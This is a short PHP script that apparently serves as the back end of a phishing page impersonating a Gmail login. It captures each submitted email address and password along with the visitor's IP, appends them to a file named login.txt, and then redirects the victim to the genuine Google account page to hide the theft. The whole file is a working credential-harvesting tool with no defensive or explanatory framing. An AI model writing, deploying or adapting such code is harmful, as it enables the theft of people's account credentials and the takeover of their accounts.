<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"] ?? '';
    $pass = $_POST["pass"] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $data = "[+] Gmail Email: $email | Pass: $pass | IP: $ip\n";
    file_put_contents("login.txt", $data, FILE_APPEND);

    header("Location: https://myaccount.google.com/");
    exit();
}
?>
